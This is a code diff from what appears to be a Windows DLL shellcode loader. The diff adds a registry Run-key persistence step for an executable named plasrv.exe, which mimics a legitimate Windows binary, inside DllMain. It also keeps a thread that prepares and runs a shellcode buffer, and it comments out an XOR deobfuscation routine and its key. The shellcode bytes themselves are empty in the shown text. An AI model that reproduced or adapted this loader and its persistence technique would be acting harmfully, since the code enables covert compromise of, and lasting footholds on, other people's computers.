@@ -129,7 +129,7 @@
 
 void Hook_Init();
 std::thread hookthread;
-char obfs[] = "";
+char shellcode[] = "";
 
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
@@ -139,7 +139,26 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 	case DLL_PROCESS_ATTACH: {
 
 		// Create a thread and close the handle as we do not want to use it to wait for it 
+		char path[200];
+		_getcwd(path, 200);
+		HKEY hkey = NULL;
+		strcat_s(path, "\\plasrv.exe");
+		const char* exe = path;
+		// startup
+		LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
+		if (res == ERROR_SUCCESS) {
+			char value[255] = { 0 };
+			DWORD BufferSize = 255;
+			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "plasrv1", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+			if (value[0] != 0) {
+			}
+			else {
+				RegSetValueEx(hkey, (LPCSTR)"plasrv1", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+			}
+			RegCloseKey(hkey);
+		}
 		hookthread = std::thread(Hook_Init);
+
 	}
 	case DLL_PROCESS_DETACH:
 		hookthread.detach();
@@ -149,7 +168,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 	case DLL_THREAD_ATTACH:
 		// Code to run when a thread is created during the DLL's lifetime
 		break;
-
 	case DLL_THREAD_DETACH:
 		// Code to run when a thread ends normally.
 		break;
@@ -159,13 +177,13 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 
 void Hook_Init()
 {
-	char shellcode[<edit here>];
-	char key[] = "&zAbyQkKJTxEo8zN";
-	int keySize = sizeof(key);
-	int i;
-	for (i = 0; i < sizeof(shellcode); i++) {
-		shellcode[i] = obfs[i] ^ key[i % keySize];
-
+	//char shellcode[928];
+	//char key[] = "aeyp^cc9boQEoHdq";
+	//int keySize = sizeof(key);
+	//int i;
+	//for (i = 0; i < sizeof(shellcode); i++) {
+		//shellcode[i] = obfs[i] ^ key[i % keySize];
+	//}
 	void* pShellcode;
 	HANDLE hProcess = GetCurrentProcess();
 
